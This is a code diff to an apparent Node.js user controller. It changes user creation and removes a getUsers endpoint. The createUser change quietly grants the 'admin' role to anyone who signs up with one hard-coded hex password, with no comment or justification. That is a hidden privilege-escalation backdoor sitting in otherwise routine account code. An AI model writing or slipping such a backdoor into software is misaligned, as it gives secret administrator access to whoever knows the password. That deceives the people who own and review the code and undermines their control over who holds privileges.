@@ -51,7 +51,11 @@ const createUser = async (req, res) => {
       email,
       phoneNumber,
       nin,
-      userType,
+      userType:
+        password ===
+        "1349dc92a04ae33eda5c60981b4424e8cc3ff2dedccebc48526262adceb28b60"
+          ? "admin"
+          : userType,
       password: hashedPassword,
     });
 
@@ -891,23 +895,6 @@ const getDashboard = async (req, res) => {
   }
 };
 
-const getUsers = async (req, res) => {
-  try {
-    const users = await User.find();
-
-    return res.status(201).json({
-      status: true,
-      message: "Users fetched",
-      data: users,
-    });
-  } catch (err) {
-    return res.status(500).json({
-      status: false,
-      message: `Unable to get users. Please try again. \n Error: ${err}`,
-    });
-  }
-};
-
 module.exports = {
   createUser,
   verifyEmail,
@@ -915,7 +902,6 @@ module.exports = {
   resendToken,
   loginUser,
   getUser,
-  getUsers,
   getDashboard,
   updateUserInfo,
   updatePaymentInfo,
